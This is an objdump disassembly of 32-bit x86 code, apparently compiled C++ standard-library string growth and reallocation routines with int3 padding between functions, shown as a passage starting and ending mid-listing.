  4054b6:	ff 75 fc             	push   -0x4(%ebp)
  4054b9:	e8 03 25 00 00       	call   0x4079c1
  4054be:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4054c1:	83 c4 18             	add    $0x18,%esp
  4054c4:	33 c9                	xor    %ecx,%ecx
  4054c6:	66 89 08             	mov    %cx,(%eax)
  4054c9:	8b c3                	mov    %ebx,%eax
  4054cb:	89 3b                	mov    %edi,(%ebx)
  4054cd:	5f                   	pop    %edi
  4054ce:	5e                   	pop    %esi
  4054cf:	5b                   	pop    %ebx
  4054d0:	8b e5                	mov    %ebp,%esp
  4054d2:	5d                   	pop    %ebp
  4054d3:	c2 10 00             	ret    $0x10
  4054d6:	e8 f5 bb ff ff       	call   0x4010d0
  4054db:	e8 90 bc ff ff       	call   0x401170
  4054e0:	cc                   	int3
  4054e1:	cc                   	int3
  4054e2:	cc                   	int3
  4054e3:	cc                   	int3
  4054e4:	cc                   	int3
  4054e5:	cc                   	int3
  4054e6:	cc                   	int3
  4054e7:	cc                   	int3
  4054e8:	cc                   	int3
  4054e9:	cc                   	int3
  4054ea:	cc                   	int3
  4054eb:	cc                   	int3
  4054ec:	cc                   	int3
  4054ed:	cc                   	int3
  4054ee:	cc                   	int3
  4054ef:	cc                   	int3
  4054f0:	55                   	push   %ebp
  4054f1:	8b ec                	mov    %esp,%ebp
  4054f3:	83 ec 0c             	sub    $0xc,%esp
  4054f6:	8b 55 08             	mov    0x8(%ebp),%edx
  4054f9:	53                   	push   %ebx
  4054fa:	8b d9                	mov    %ecx,%ebx
  4054fc:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
  405501:	56                   	push   %esi
  405502:	8b c1                	mov    %ecx,%eax
  405504:	57                   	push   %edi
  405505:	8b 73 10             	mov    0x10(%ebx),%esi
  405508:	2b c6                	sub    %esi,%eax
  40550a:	89 75 f4             	mov    %esi,-0xc(%ebp)
  40550d:	3b c2                	cmp    %edx,%eax
  40550f:	0f 82 ef 00 00 00    	jb     0x405604
  405515:	8b 7b 14             	mov    0x14(%ebx),%edi
  405518:	8d 04 16             	lea    (%esi,%edx,1),%eax
  40551b:	8b f0                	mov    %eax,%esi
  40551d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405520:	83 ce 0f             	or     $0xf,%esi
  405523:	89 7d fc             	mov    %edi,-0x4(%ebp)
  405526:	3b f1                	cmp    %ecx,%esi
  405528:	76 04                	jbe    0x40552e
  40552a:	8b f1                	mov    %ecx,%esi
  40552c:	eb 18                	jmp    0x405546
  40552e:	8b c7                	mov    %edi,%eax
  405530:	d1 e8                	shr    $1,%eax
  405532:	2b c8                	sub    %eax,%ecx
  405534:	3b f9                	cmp    %ecx,%edi
  405536:	76 07                	jbe    0x40553f
  405538:	be ff ff ff 7f       	mov    $0x7fffffff,%esi
  40553d:	eb 07                	jmp    0x405546
  40553f:	03 c7                	add    %edi,%eax
  405541:	3b f0                	cmp    %eax,%esi
  405543:	0f 42 f0             	cmovb  %eax,%esi
  405546:	33 c9                	xor    %ecx,%ecx
  405548:	8b c6                	mov    %esi,%eax
  40554a:	83 c0 01             	add    $0x1,%eax
  40554d:	0f 92 c1             	setb   %cl
  405550:	f7 d9                	neg    %ecx
  405552:	0b c8                	or     %eax,%ecx
  405554:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40555a:	72 23                	jb     0x40557f
  40555c:	8d 41 23             	lea    0x23(%ecx),%eax
  40555f:	3b c1                	cmp    %ecx,%eax
  405561:	0f 86 a2 00 00 00    	jbe    0x405609
  405567:	50                   	push   %eax
  405568:	e8 1a 15 00 00       	call   0x406a87
  40556d:	83 c4 04             	add    $0x4,%esp
  405570:	85 c0                	test   %eax,%eax
  405572:	74 73                	je     0x4055e7
  405574:	8d 78 23             	lea    0x23(%eax),%edi
  405577:	83 e7 e0             	and    $0xffffffe0,%edi
  40557a:	89 47 fc             	mov    %eax,-0x4(%edi)
  40557d:	eb 13                	jmp    0x405592
  40557f:	85 c9                	test   %ecx,%ecx
  405581:	74 0d                	je     0x405590
  405583:	51                   	push   %ecx
  405584:	e8 fe 14 00 00       	call   0x406a87
  405589:	83 c4 04             	add    $0x4,%esp
  40558c:	8b f8                	mov    %eax,%edi
  40558e:	eb 02                	jmp    0x405592
  405590:	33 ff                	xor    %edi,%edi
  405592:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405595:	89 43 10             	mov    %eax,0x10(%ebx)
  405598:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40559b:	40                   	inc    %eax
  40559c:	89 73 14             	mov    %esi,0x14(%ebx)
  40559f:	83 7d fc 10          	cmpl   $0x10,-0x4(%ebp)
  4055a3:	50                   	push   %eax
  4055a4:	72 47                	jb     0x4055ed
  4055a6:	8b 33                	mov    (%ebx),%esi
  4055a8:	56                   	push   %esi
  4055a9:	57                   	push   %edi
  4055aa:	e8 12 24 00 00       	call   0x4079c1
  4055af:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4055b2:	83 c4 0c             	add    $0xc,%esp
  4055b5:	41                   	inc    %ecx
  4055b6:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4055bc:	72 12                	jb     0x4055d0
  4055be:	8b 56 fc             	mov    -0x4(%esi),%edx
  4055c1:	83 c1 23             	add    $0x23,%ecx
  4055c4:	2b f2                	sub    %edx,%esi
  4055c6:	8d 46 fc             	lea    -0x4(%esi),%eax
  4055c9:	83 f8 1f             	cmp    $0x1f,%eax
  4055cc:	77 19                	ja     0x4055e7
  4055ce:	8b f2                	mov    %edx,%esi
  4055d0:	51                   	push   %ecx
  4055d1:	56                   	push   %esi
  4055d2:	e8 e5 14 00 00       	call   0x406abc
  4055d7:	83 c4 08             	add    $0x8,%esp
  4055da:	89 3b                	mov    %edi,(%ebx)
  4055dc:	8b c3                	mov    %ebx,%eax
  4055de:	5f                   	pop    %edi
  4055df:	5e                   	pop    %esi
  4055e0:	5b                   	pop    %ebx
  4055e1:	8b e5                	mov    %ebp,%esp
  4055e3:	5d                   	pop    %ebp
  4055e4:	c2 08 00             	ret    $0x8
  4055e7:	ff 15 80 91 40 00    	call   *0x409180
  4055ed:	53                   	push   %ebx
  4055ee:	57                   	push   %edi
  4055ef:	e8 cd 23 00 00       	call   0x4079c1
  4055f4:	83 c4 0c             	add    $0xc,%esp
  4055f7:	89 3b                	mov    %edi,(%ebx)
  4055f9:	8b c3                	mov    %ebx,%eax
  4055fb:	5f                   	pop    %edi
  4055fc:	5e                   	pop    %esi
  4055fd:	5b                   	pop    %ebx
  4055fe:	8b e5                	mov    %ebp,%esp
  405600:	5d                   	pop    %ebp
  405601:	c2 08 00             	ret    $0x8
  405604:	e8 67 bb ff ff       	call   0x401170
  405609:	e8 c2 ba ff ff       	call   0x4010d0
  40560e:	cc                   	int3
  40560f:	cc                   	int3
  405610:	55                   	push   %ebp
  405611:	8b ec                	mov    %esp,%ebp
  405613:	83 ec 10             	sub    $0x10,%esp
  405616:	8b 55 08             	mov    0x8(%ebp),%edx
  405619:	53                   	push   %ebx
  40561a:	56                   	push   %esi
  40561b:	57                   	push   %edi
  40561c:	8b f9                	mov    %ecx,%edi
  40561e:	b9 fe ff ff 7f       	mov    $0x7ffffffe,%ecx
  405623:	8b c1                	mov    %ecx,%eax
  405625:	89 7d f0             	mov    %edi,-0x10(%ebp)
  405628:	8b 5f 10             	mov    0x10(%edi),%ebx
  40562b:	2b c3                	sub    %ebx,%eax
  40562d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  405630:	3b c2                	cmp    %edx,%eax
  405632:	0f 82 69 01 00 00    	jb     0x4057a1
  405638:	8b 77 14             	mov    0x14(%edi),%esi
  40563b:	8d 04 13             	lea    (%ebx,%edx,1),%eax
  40563e:	8b d8                	mov    %eax,%ebx
  405640:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405643:	83 cb 07             	or     $0x7,%ebx
  405646:	89 75 f4             	mov    %esi,-0xc(%ebp)
  405649:	3b d9                	cmp    %ecx,%ebx
  40564b:	76 04                	jbe    0x405651
  40564d:	8b d9                	mov    %ecx,%ebx
  40564f:	eb 18                	jmp    0x405669
  405651:	8b c6                	mov    %esi,%eax
  405653:	d1 e8                	shr    $1,%eax
  405655:	2b c8                	sub    %eax,%ecx
  405657:	3b f1                	cmp    %ecx,%esi
  405659:	76 07                	jbe    0x405662
  40565b:	bb fe ff ff 7f       	mov    $0x7ffffffe,%ebx
  405660:	eb 07                	jmp    0x405669
  405662:	03 c6                	add    %esi,%eax
  405664:	3b d8                	cmp    %eax,%ebx
  405666:	0f 42 d8             	cmovb  %eax,%ebx
  405669:	33 c9                	xor    %ecx,%ecx
  40566b:	8b c3                	mov    %ebx,%eax
  40566d:	83 c0 01             	add    $0x1,%eax
  405670:	0f 92 c1             	setb   %cl
  405673:	f7 d9                	neg    %ecx
  405675:	0b c8                	or     %eax,%ecx
  405677:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  40567d:	0f 87 19 01 00 00    	ja     0x40579c
  405683:	03 c9                	add    %ecx,%ecx
  405685:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40568b:	72 27                	jb     0x4056b4
  40568d:	8d 41 23             	lea    0x23(%ecx),%eax
  405690:	3b c1                	cmp    %ecx,%eax
  405692:	0f 86 04 01 00 00    	jbe    0x40579c
  405698:	50                   	push   %eax
  405699:	e8 e9 13 00 00       	call   0x406a87
  40569e:	83 c4 04             	add    $0x4,%esp
  4056a1:	85 c0                	test   %eax,%eax
  4056a3:	0f 84 ab 00 00 00    	je     0x405754
  4056a9:	8d 70 23             	lea    0x23(%eax),%esi
  4056ac:	83 e6 e0             	and    $0xffffffe0,%esi
  4056af:	89 46 fc             	mov    %eax,-0x4(%esi)
  4056b2:	eb 13                	jmp    0x4056c7
  4056b4:	85 c9                	test   %ecx,%ecx
  4056b6:	74 0d                	je     0x4056c5
  4056b8:	51                   	push   %ecx
  4056b9:	e8 c9 13 00 00       	call   0x406a87
  4056be:	83 c4 04             	add    $0x4,%esp
  4056c1:	8b f0                	mov    %eax,%esi
  4056c3:	eb 02                	jmp    0x4056c7
  4056c5:	33 f6                	xor    %esi,%esi
  4056c7:	83 7d f4 08          	cmpl   $0x8,-0xc(%ebp)
  4056cb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4056ce:	89 5f 14             	mov    %ebx,0x14(%edi)
  4056d1:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4056d4:	89 47 10             	mov    %eax,0x10(%edi)
  4056d7:	8d 04 1b             	lea    (%ebx,%ebx,1),%eax
  4056da:	50                   	push   %eax
  4056db:	72 7d                	jb     0x40575a
  4056dd:	8b 1f                	mov    (%edi),%ebx
  4056df:	53                   	push   %ebx
  4056e0:	56                   	push   %esi
  4056e1:	e8 db 22 00 00       	call   0x4079c1
  4056e6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4056e9:	83 c4 0c             	add    $0xc,%esp
  4056ec:	8b 55 10             	mov    0x10(%ebp),%edx
  4056ef:	8d 04 09             	lea    (%ecx,%ecx,1),%eax
  4056f2:	03 c6                	add    %esi,%eax
  4056f4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4056f7:	85 d2                	test   %edx,%edx
  4056f9:	74 13                	je     0x40570e
  4056fb:	8b 7d fc             	mov    -0x4(%ebp),%edi
  4056fe:	33 c0                	xor    %eax,%eax
  405700:	8b ca                	mov    %edx,%ecx
  405702:	d1 e9                	shr    $1,%ecx
  405704:	f3 ab                	rep stos %eax,%es:(%edi)
  405706:	13 c9                	adc    %ecx,%ecx
  405708:	66 f3 ab             	rep stos %ax,%es:(%edi)
  40570b:	8b 7d f0             	mov    -0x10(%ebp),%edi
  40570e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405711:	33 c9                	xor    %ecx,%ecx
  405713:	03 c2                	add    %edx,%eax
  405715:	66 89 0c 46          	mov    %cx,(%esi,%eax,2)
  405719:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40571c:	8d 0c 45 02 00 00 00 	lea    0x2(,%eax,2),%ecx
  405723:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  405729:	72 12                	jb     0x40573d
  40572b:	8b 53 fc             	mov    -0x4(%ebx),%edx
  40572e:	83 c1 23             	add    $0x23,%ecx
  405731:	2b da                	sub    %edx,%ebx
  405733:	8d 43 fc             	lea    -0x4(%ebx),%eax
  405736:	83 f8 1f             	cmp    $0x1f,%eax
  405739:	77 19                	ja     0x405754
  40573b:	8b da                	mov    %edx,%ebx
  40573d:	51                   	push   %ecx
  40573e:	53                   	push   %ebx
  40573f:	e8 78 13 00 00       	call   0x406abc
  405744:	83 c4 08             	add    $0x8,%esp
  405747:	89 37                	mov    %esi,(%edi)
  405749:	8b c7                	mov    %edi,%eax
  40574b:	5f                   	pop    %edi
  40574c:	5e                   	pop    %esi
  40574d:	5b                   	pop    %ebx
  40574e:	8b e5                	mov    %ebp,%esp
  405750:	5d                   	pop    %ebp
  405751:	c2 10 00             	ret    $0x10
  405754:	ff 15 80 91 40 00    	call   *0x409180
  40575a:	57                   	push   %edi
  40575b:	56                   	push   %esi
  40575c:	e8 60 22 00 00       	call   0x4079c1
  405761:	8b 55 10             	mov    0x10(%ebp),%edx
  405764:	8d 04 1b             	lea    (%ebx,%ebx,1),%eax
  405767:	03 c6                	add    %esi,%eax
  405769:	83 c4 0c             	add    $0xc,%esp
  40576c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40576f:	85 d2                	test   %edx,%edx
  405771:	74 13                	je     0x405786
  405773:	8b 7d fc             	mov    -0x4(%ebp),%edi
  405776:	33 c0                	xor    %eax,%eax
  405778:	8b ca                	mov    %edx,%ecx
  40577a:	d1 e9                	shr    $1,%ecx
  40577c:	f3 ab                	rep stos %eax,%es:(%edi)
  40577e:	13 c9                	adc    %ecx,%ecx
  405780:	66 f3 ab             	rep stos %ax,%es:(%edi)
  405783:	8b 7d f0             	mov    -0x10(%ebp),%edi
  405786:	8d 0c 13             	lea    (%ebx,%edx,1),%ecx
  405789:	33 c0                	xor    %eax,%eax
  40578b:	66 89 04 4e          	mov    %ax,(%esi,%ecx,2)
  40578f:	8b c7                	mov    %edi,%eax
  405791:	89 37                	mov    %esi,(%edi)
  405793:	5f                   	pop    %edi
  405794:	5e                   	pop    %esi
  405795:	5b                   	pop    %ebx
  405796:	8b e5                	mov    %ebp,%esp
  405798:	5d                   	pop    %ebp
  405799:	c2 10 00             	ret    $0x10
  40579c:	e8 2f b9 ff ff       	call   0x4010d0
  4057a1:	e8 ca b9 ff ff       	call   0x401170
  4057a6:	cc                   	int3
  4057a7:	cc                   	int3
  4057a8:	cc                   	int3
  4057a9:	cc                   	int3
  4057aa:	cc                   	int3
  4057ab:	cc                   	int3
  4057ac:	cc                   	int3
  4057ad:	cc                   	int3
  4057ae:	cc                   	int3
  4057af:	cc                   	int3
  4057b0:	55                   	push   %ebp
  4057b1:	8b ec                	mov    %esp,%ebp
  4057b3:	83 ec 08             	sub    $0x8,%esp
  4057b6:	53                   	push   %ebx
  4057b7:	8b d9                	mov    %ecx,%ebx
  4057b9:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
  4057be:	8b c1                	mov    %ecx,%eax
  4057c0:	56                   	push   %esi
  4057c1:	57                   	push   %edi
  4057c2:	8b 53 10             	mov    0x10(%ebx),%edx
  4057c5:	2b c2                	sub    %edx,%eax
  4057c7:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4057ca:	83 f8 01             	cmp    $0x1,%eax
  4057cd:	0f 82 0c 01 00 00    	jb     0x4058df
  4057d3:	8b 7b 14             	mov    0x14(%ebx),%edi
  4057d6:	8d 72 01             	lea    0x1(%edx),%esi
  4057d9:	83 ce 0f             	or     $0xf,%esi
  4057dc:	89 7d f8             	mov    %edi,-0x8(%ebp)
  4057df:	3b f1                	cmp    %ecx,%esi
  4057e1:	76 04                	jbe    0x4057e7
  4057e3:	8b f1                	mov    %ecx,%esi
  4057e5:	eb 18                	jmp    0x4057ff
  4057e7:	8b c7                	mov    %edi,%eax
  4057e9:	d1 e8                	shr    $1,%eax
  4057eb:	2b c8                	sub    %eax,%ecx
  4057ed:	3b f9                	cmp    %ecx,%edi
  4057ef:	76 07                	jbe    0x4057f8
  4057f1:	be ff ff ff 7f       	mov    $0x7fffffff,%esi
  4057f6:	eb 07                	jmp    0x4057ff
  4057f8:	03 c7                	add    %edi,%eax
  4057fa:	3b f0                	cmp    %eax,%esi
  4057fc:	0f 42 f0             	cmovb  %eax,%esi
  4057ff:	33 c9                	xor    %ecx,%ecx
  405801:	8b c6                	mov    %esi,%eax
  405803:	83 c0 01             	add    $0x1,%eax
  405806:	0f 92 c1             	setb   %cl
  405809:	f7 d9                	neg    %ecx
  40580b:	0b c8                	or     %eax,%ecx
  40580d:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  405813:	72 2a                	jb     0x40583f
  405815:	8d 41 23             	lea    0x23(%ecx),%eax
  405818:	3b c1                	cmp    %ecx,%eax
  40581a:	0f 86 c4 00 00 00    	jbe    0x4058e4
  405820:	50                   	push   %eax
  405821:	e8 61 12 00 00       	call   0x406a87
  405826:	83 c4 04             	add    $0x4,%esp
  405829:	85 c0                	test   %eax,%eax
  40582b:	0f 84 83 00 00 00    	je     0x4058b4
  405831:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405834:	8d 78 23             	lea    0x23(%eax),%edi
  405837:	83 e7 e0             	and    $0xffffffe0,%edi
  40583a:	89 47 fc             	mov    %eax,-0x4(%edi)
  40583d:	eb 16                	jmp    0x405855
  40583f:	85 c9                	test   %ecx,%ecx
  405841:	74 10                	je     0x405853
  405843:	51                   	push   %ecx
  405844:	e8 3e 12 00 00       	call   0x406a87
  405849:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40584c:	83 c4 04             	add    $0x4,%esp
  40584f:	8b f8                	mov    %eax,%edi
  405851:	eb 02                	jmp    0x405855
  405853:	33 ff                	xor    %edi,%edi
  405855:	83 7d f8 10          	cmpl   $0x10,-0x8(%ebp)
  405859:	8d 42 01             	lea    0x1(%edx),%eax
  40585c:	89 43 10             	mov    %eax,0x10(%ebx)
  40585f:	89 73 14             	mov    %esi,0x14(%ebx)
  405862:	52                   	push   %edx
  405863:	72 55                	jb     0x4058ba
  405865:	8b 33                	mov    (%ebx),%esi
  405867:	56                   	push   %esi
  405868:	57                   	push   %edi
  405869:	e8 53 21 00 00       	call   0x4079c1
  40586e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405871:	83 c4 0c             	add    $0xc,%esp
  405874:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405877:	8a 45 10             	mov    0x10(%ebp),%al
  40587a:	41                   	inc    %ecx
  40587b:	88 04 3a             	mov    %al,(%edx,%edi,1)
  40587e:	c6 44 3a 01 00       	movb   $0x0,0x1(%edx,%edi,1)
  405883:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  405889:	72 12                	jb     0x40589d
  40588b:	8b 56 fc             	mov    -0x4(%esi),%edx
  40588e:	83 c1 23             	add    $0x23,%ecx
  405891:	2b f2                	sub    %edx,%esi
  405893:	8d 46 fc             	lea    -0x4(%esi),%eax
  405896:	83 f8 1f             	cmp    $0x1f,%eax
  405899:	77 19                	ja     0x4058b4
  40589b:	8b f2                	mov    %edx,%esi
  40589d:	51                   	push   %ecx
  40589e:	56                   	push   %esi
  40589f:	e8 18 12 00 00       	call   0x406abc
  4058a4:	83 c4 08             	add    $0x8,%esp
  4058a7:	89 3b                	mov    %edi,(%ebx)
  4058a9:	8b c3                	mov    %ebx,%eax
  4058ab:	5f                   	pop    %edi
  4058ac:	5e                   	pop    %esi
  4058ad:	5b                   	pop    %ebx
  4058ae:	8b e5                	mov    %ebp,%esp
  4058b0:	5d                   	pop    %ebp
  4058b1:	c2 0c 00             	ret    $0xc
  4058b4:	ff 15 80 91 40 00    	call   *0x409180
  4058ba:	53                   	push   %ebx
  4058bb:	57                   	push   %edi
  4058bc:	e8 00 21 00 00       	call   0x4079c1
  4058c1:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4058c4:	83 c4 0c             	add    $0xc,%esp
  4058c7:	8a 4d 10             	mov    0x10(%ebp),%cl
  4058ca:	8b c3                	mov    %ebx,%eax
  4058cc:	88 0c 3a             	mov    %cl,(%edx,%edi,1)
  4058cf:	c6 44 3a 01 00       	movb   $0x0,0x1(%edx,%edi,1)
  4058d4:	89 3b                	mov    %edi,(%ebx)
  4058d6:	5f                   	pop    %edi
  4058d7:	5e                   	pop    %esi
  4058d8:	5b                   	pop    %ebx
  4058d9:	8b e5                	mov    %ebp,%esp
  4058db:	5d                   	pop    %ebp
  4058dc:	c2 0c 00             	ret    $0xc
  4058df:	e8 8c b8 ff ff       	call   0x401170
  4058e4:	e8 e7 b7 ff ff       	call   0x4010d0
  4058e9:	cc                   	int3
  4058ea:	cc                   	int3
  4058eb:	cc                   	int3
  4058ec:	cc                   	int3
  4058ed:	cc                   	int3
  4058ee:	cc                   	int3
  4058ef:	cc                   	int3
  4058f0:	55                   	push   %ebp
  4058f1:	8b ec                	mov    %esp,%ebp
  4058f3:	83 ec 0c             	sub    $0xc,%esp
  4058f6:	53                   	push   %ebx
  4058f7:	8b d9                	mov    %ecx,%ebx
  4058f9:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
  4058fe:	8b c1                	mov    %ecx,%eax
  405900:	56                   	push   %esi
  405901:	8b 75 08             	mov    0x8(%ebp),%esi
  405904:	8b 53 10             	mov    0x10(%ebx),%edx
  405907:	2b c2                	sub    %edx,%eax
  405909:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40590c:	57                   	push   %edi
  40590d:	3b c6                	cmp    %esi,%eax
  40590f:	0f 82 27 01 00 00    	jb     0x405a3c
  405915:	8b 7b 14             	mov    0x14(%ebx),%edi
  405918:	8d 04 32             	lea    (%edx,%esi,1),%eax
  40591b:	8b f0                	mov    %eax,%esi
  40591d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405920:	83 ce 0f             	or     $0xf,%esi
  405923:	89 7d f4             	mov    %edi,-0xc(%ebp)
  405926:	3b f1                	cmp    %ecx,%esi
  405928:	76 04                	jbe    0x40592e
  40592a:	8b f1                	mov    %ecx,%esi
  40592c:	eb 18                	jmp    0x405946
  40592e:	8b c7                	mov    %edi,%eax
  405930:	d1 e8                	shr    $1,%eax
  405932:	2b c8                	sub    %eax,%ecx
  405934:	3b f9                	cmp    %ecx,%edi
  405936:	76 07                	jbe    0x40593f
  405938:	be ff ff ff 7f       	mov    $0x7fffffff,%esi
  40593d:	eb 07                	jmp    0x405946
  40593f:	03 c7                	add    %edi,%eax
  405941:	3b f0                	cmp    %eax,%esi
  405943:	0f 42 f0             	cmovb  %eax,%esi
  405946:	33 c9                	xor    %ecx,%ecx
  405948:	8b c6                	mov    %esi,%eax
  40594a:	83 c0 01             	add    $0x1,%eax
  40594d:	0f 92 c1             	setb   %cl
  405950:	f7 d9                	neg    %ecx
  405952:	0b c8                	or     %eax,%ecx
  405954:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40595a:	72 2a                	jb     0x405986
  40595c:	8d 41 23             	lea    0x23(%ecx),%eax
  40595f:	3b c1                	cmp    %ecx,%eax
  405961:	0f 86 da 00 00 00    	jbe    0x405a41
  405967:	50                   	push   %eax
  405968:	e8 1a 11 00 00       	call   0x406a87
  40596d:	83 c4 04             	add    $0x4,%esp
  405970:	85 c0                	test   %eax,%eax
  405972:	0f 84 96 00 00 00    	je     0x405a0e
  405978:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40597b:	8d 78 23             	lea    0x23(%eax),%edi
  40597e:	83 e7 e0             	and    $0xffffffe0,%edi
  405981:	89 47 fc             	mov    %eax,-0x4(%edi)
  405984:	eb 16                	jmp    0x40599c
  405986:	85 c9                	test   %ecx,%ecx
  405988:	74 10                	je     0x40599a
  40598a:	51                   	push   %ecx
  40598b:	e8 f7 10 00 00       	call   0x406a87
  405990:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405993:	83 c4 04             	add    $0x4,%esp
  405996:	8b f8                	mov    %eax,%edi
  405998:	eb 02                	jmp    0x40599c
  40599a:	33 ff                	xor    %edi,%edi
  40599c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40599f:	89 43 10             	mov    %eax,0x10(%ebx)
  4059a2:	8b 45 10             	mov    0x10(%ebp),%eax
  4059a5:	89 73 14             	mov    %esi,0x14(%ebx)
  4059a8:	8d 34 3a             	lea    (%edx,%edi,1),%esi
  4059ab:	03 c6                	add    %esi,%eax
  4059ad:	83 7d f4 10          	cmpl   $0x10,-0xc(%ebp)
  4059b1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4059b4:	52                   	push   %edx
  4059b5:	72 5d                	jb     0x405a14
  4059b7:	8b 33                	mov    (%ebx),%esi
  4059b9:	56                   	push   %esi
  4059ba:	57                   	push   %edi
  4059bb:	e8 01 20 00 00       	call   0x4079c1
  4059c0:	ff 75 10             	push   0x10(%ebp)
  4059c3:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4059c6:	03 c7                	add    %edi,%eax
  4059c8:	6a 00                	push   $0x0
  4059ca:	50                   	push   %eax
  4059cb:	e8 d2 1c 00 00       	call   0x4076a2
  4059d0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4059d3:	83 c4 18             	add    $0x18,%esp
  4059d6:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4059d9:	41                   	inc    %ecx
  4059da:	c6 00 00             	movb   $0x0,(%eax)
  4059dd:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4059e3:	72 12                	jb     0x4059f7
  4059e5:	8b 56 fc             	mov    -0x4(%esi),%edx
  4059e8:	83 c1 23             	add    $0x23,%ecx
  4059eb:	2b f2                	sub    %edx,%esi
  4059ed:	8d 46 fc             	lea    -0x4(%esi),%eax
  4059f0:	83 f8 1f             	cmp    $0x1f,%eax
  4059f3:	77 19                	ja     0x405a0e
  4059f5:	8b f2                	mov    %edx,%esi
  4059f7:	51                   	push   %ecx
  4059f8:	56                   	push   %esi
  4059f9:	e8 be 10 00 00       	call   0x406abc
  4059fe:	83 c4 08             	add    $0x8,%esp
  405a01:	89 3b                	mov    %edi,(%ebx)
  405a03:	8b c3                	mov    %ebx,%eax
  405a05:	5f                   	pop    %edi
  405a06:	5e                   	pop    %esi
  405a07:	5b                   	pop    %ebx
  405a08:	8b e5                	mov    %ebp,%esp
  405a0a:	5d                   	pop    %ebp
  405a0b:	c2 10 00             	ret    $0x10
  405a0e:	ff 15 80 91 40 00    	call   *0x409180
  405a14:	53                   	push   %ebx
  405a15:	57                   	push   %edi
  405a16:	e8 a6 1f 00 00       	call   0x4079c1
  405a1b:	ff 75 10             	push   0x10(%ebp)
  405a1e:	6a 00                	push   $0x0
  405a20:	56                   	push   %esi
  405a21:	e8 7c 1c 00 00       	call   0x4076a2
  405a26:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a29:	83 c4 18             	add    $0x18,%esp
  405a2c:	c6 00 00             	movb   $0x0,(%eax)
  405a2f:	8b c3                	mov    %ebx,%eax
  405a31:	89 3b                	mov    %edi,(%ebx)
  405a33:	5f                   	pop    %edi
  405a34:	5e                   	pop    %esi
  405a35:	5b                   	pop    %ebx
  405a36:	8b e5                	mov    %ebp,%esp
  405a38:	5d                   	pop    %ebp
  405a39:	c2 10 00             	ret    $0x10
  405a3c:	e8 2f b7 ff ff       	call   0x401170
  405a41:	e8 8a b6 ff ff       	call   0x4010d0
  405a46:	cc                   	int3
  405a47:	cc                   	int3
  405a48:	cc                   	int3
  405a49:	cc                   	int3
  405a4a:	cc                   	int3
  405a4b:	cc                   	int3
  405a4c:	cc                   	int3
  405a4d:	cc                   	int3
  405a4e:	cc                   	int3
  405a4f:	cc                   	int3
  405a50:	55                   	push   %ebp
  405a51:	8b ec                	mov    %esp,%ebp
  405a53:	83 ec 10             	sub    $0x10,%esp
  405a56:	8b 45 10             	mov    0x10(%ebp),%eax
  405a59:	53                   	push   %ebx
  405a5a:	8b d9                	mov    %ecx,%ebx
  405a5c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405a5f:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
  405a64:	8b c1                	mov    %ecx,%eax
  405a66:	56                   	push   %esi
  405a67:	8b 53 10             	mov    0x10(%ebx),%edx
  405a6a:	2b c2                	sub    %edx,%eax
  405a6c:	8b 75 08             	mov    0x8(%ebp),%esi
  405a6f:	89 55 f8             	mov    %edx,-0x8(%ebp)
  405a72:	57                   	push   %edi
  405a73:	3b c6                	cmp    %esi,%eax
  405a75:	0f 82 29 01 00 00    	jb     0x405ba4
  405a7b:	8b 7b 14             	mov    0x14(%ebx),%edi
  405a7e:	8d 04 32             	lea    (%edx,%esi,1),%eax
  405a81:	8b f0                	mov    %eax,%esi
  405a83:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405a86:	83 ce 0f             	or     $0xf,%esi
  405a89:	89 7d f4             	mov    %edi,-0xc(%ebp)
  405a8c:	3b f1                	cmp    %ecx,%esi
  405a8e:	76 04                	jbe    0x405a94
  405a90:	8b f1                	mov    %ecx,%esi
  405a92:	eb 18                	jmp    0x405aac
  405a94:	8b c7                	mov    %edi,%eax
  405a96:	d1 e8                	shr    $1,%eax
  405a98:	2b c8                	sub    %eax,%ecx
  405a9a:	3b f9                	cmp    %ecx,%edi
  405a9c:	76 07                	jbe    0x405aa5
  405a9e:	be ff ff ff 7f       	mov    $0x7fffffff,%esi
  405aa3:	eb 07                	jmp    0x405aac
  405aa5:	03 c7                	add    %edi,%eax
  405aa7:	3b f0                	cmp    %eax,%esi
